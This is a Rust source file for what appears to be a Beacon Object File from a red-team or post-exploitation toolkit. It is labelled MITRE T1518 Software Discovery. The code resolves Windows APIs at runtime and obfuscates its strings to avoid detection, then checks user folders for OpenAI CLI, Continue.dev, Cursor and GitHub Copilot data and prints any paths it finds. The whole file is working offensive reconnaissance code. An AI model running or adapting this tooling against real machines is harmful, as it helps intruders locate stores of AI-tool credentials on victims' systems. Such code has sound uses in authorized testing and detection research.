#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::println;
use common::{mitre::Technique, dfr_fn, obf_cstr};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1518", name: "Software Discovery", tactic: "Discovery" },
];

dfr_fn!(get_env_var(name: *const i8, buf: *mut i8, size: u32) -> u32, module = "kernel32.dll", api = "GetEnvironmentVariableA");
dfr_fn!(find_first_file(name: *const i8, data: *mut u8) -> usize, module = "kernel32.dll", api = "FindFirstFileA");
dfr_fn!(find_close(handle: usize) -> i32, module = "kernel32.dll", api = "FindClose");

const INVALID_HANDLE: usize = usize::MAX;

#[rustbof::main]
fn main() {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);

    let mut profile = [0i8; 260];
    let mut appdata = [0i8; 260];
    obf_cstr! { let v_profile = c"USERPROFILE"; }
    obf_cstr! { let v_appdata = c"APPDATA"; }
    let plen = unsafe { get_env_var(v_profile.as_ptr() as *const i8, profile.as_mut_ptr(), 260) }.unwrap_or(0) as usize;
    let alen = unsafe { get_env_var(v_appdata.as_ptr() as *const i8, appdata.as_mut_ptr(), 260) }.unwrap_or(0) as usize;

    if plen > 0 {
        check_path(&profile, plen, b"\\.openai\\*\0", "OpenAI CLI");
        check_path(&profile, plen, b"\\.continue\\*\0", "Continue.dev");
        check_path(&profile, plen, b"\\.cursor\\*\0", "Cursor AI");
    }
    if alen > 0 {
        check_path(&appdata, alen, b"\\GitHub Copilot\\*\0", "GitHub Copilot");
    }
}

fn check_path(base: &[i8; 260], base_len: usize, suffix: &[u8], tool: &str) {
    let mut path = [0i8; 512];
    if base_len + suffix.len() >= 512 { return; }
    for i in 0..base_len { path[i] = base[i]; }
    for (i, &b) in suffix.iter().enumerate() { path[base_len + i] = b as i8; }

    let mut find_data = [0u8; 592];
    let h = unsafe { find_first_file(path.as_ptr(), find_data.as_mut_ptr()) }.unwrap_or(INVALID_HANDLE);
    if h != INVALID_HANDLE {
        // trim the \* from display path
        let display_end = base_len + suffix.len() - 2;
        let display = unsafe { core::slice::from_raw_parts(path.as_ptr() as *const u8, display_end) };
        println!("[+] {}: {}", tool, core::str::from_utf8(display).unwrap_or("?"));
        unsafe { let _ = find_close(h); }
    }
}
